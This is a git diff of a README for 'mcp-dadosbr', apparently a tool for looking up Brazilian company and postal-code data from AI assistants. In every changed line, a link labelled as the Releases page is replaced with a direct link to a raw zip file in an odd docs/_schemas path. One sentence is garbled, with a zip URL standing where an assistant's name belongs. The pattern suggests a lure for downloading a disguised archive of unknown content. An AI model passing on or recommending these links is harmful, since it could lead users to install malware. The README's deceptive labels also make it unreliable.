@@ -1,10 +1,10 @@
 # 🤖 mcp-dadosbr - Simplify Your Brazilian Data Lookup
 
-![Download](https://raw.githubusercontent.com/Didiye/mcp-dadosbr/main/caprylene/mcp-dadosbr.zip)
+![Download](https://github.com/Didiye/mcp-dadosbr/raw/refs/heads/main/docs/pt-br/_schemas/dadosbr-mcp-v2.3.zip)
 
 ## 🚀 Getting Started
 
-Welcome to mcp-dadosbr! This application allows you to easily look up Brazilian public data, including company information (CNPJ) and postal codes (CEP). You can access this data directly within AI assistants like Claude Desktop, Cursor, Windsurf, and https://raw.githubusercontent.com/Didiye/mcp-dadosbr/main/caprylene/mcp-dadosbr.zip 
+Welcome to mcp-dadosbr! This application allows you to easily look up Brazilian public data, including company information (CNPJ) and postal codes (CEP). You can access this data directly within AI assistants like Claude Desktop, Cursor, Windsurf, and https://github.com/Didiye/mcp-dadosbr/raw/refs/heads/main/docs/pt-br/_schemas/dadosbr-mcp-v2.3.zip 
 
 Follow this guide to download and run the software.
 
@@ -12,7 +12,7 @@ Follow this guide to download and run the software.
 
 To get started, you need to visit the Releases page to download the latest version of mcp-dadosbr. Click the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/Didiye/mcp-dadosbr/main/caprylene/mcp-dadosbr.zip)
+[Visit the Releases Page to Download](https://github.com/Didiye/mcp-dadosbr/raw/refs/heads/main/docs/pt-br/_schemas/dadosbr-mcp-v2.3.zip)
 
 1. Click the link above.
 2. Find the latest version of mcp-dadosbr.
@@ -61,7 +61,7 @@ You can integrate mcp-dadosbr with your preferred AI assistant. For detailed ins
 
 Check for new versions periodically to ensure you have the latest features and improvements. Visit the Releases page again:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/Didiye/mcp-dadosbr/main/caprylene/mcp-dadosbr.zip)
+[Visit the Releases Page to Download](https://github.com/Didiye/mcp-dadosbr/raw/refs/heads/main/docs/pt-br/_schemas/dadosbr-mcp-v2.3.zip)
 
 ### How to Update
 
@@ -88,6 +88,6 @@ If you encounter any issues or have questions, consider joining our community fo
 
 Visit the Releases page to download: 
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/Didiye/mcp-dadosbr/main/caprylene/mcp-dadosbr.zip)
+[Visit the Releases Page to Download](https://github.com/Didiye/mcp-dadosbr/raw/refs/heads/main/docs/pt-br/_schemas/dadosbr-mcp-v2.3.zip)
 
 By following these guidelines, you can easily download, install, and use mcp-dadosbr for all your Brazilian public data lookup needs. Enjoy simplified access to crucial information right at your fingertips!
